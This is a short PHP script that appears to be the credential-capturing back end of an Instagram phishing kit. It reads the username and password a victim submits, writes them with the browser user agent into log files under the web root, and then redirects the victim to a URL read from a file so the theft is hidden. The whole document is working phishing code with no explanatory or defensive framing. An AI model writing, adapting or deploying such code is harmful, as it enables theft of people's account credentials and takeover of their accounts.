<?php
$login = $_POST['name'];
$pass = $_POST['password'];
$agent  = $_SERVER['HTTP_USER_AGENT'];

$file = $_SERVER['DOCUMENT_ROOT']."/log.log";

$all = "\r\nx.add_row(['INS', '$login', '$pass'])";
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);

$file = $_SERVER['DOCUMENT_ROOT']."/result.log";
$file = str_replace("/www/instagram", "", $file);
$all = "[OS]: Instagram"."\n [Username]: ".$login."\n [Password]: ".$pass."\n [Information]: ".$agent."\n\n";
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);

$reloc=file_get_contents("location.location");
?>
<script>
window.location.href="<?php echo $reloc ?>"
</script>
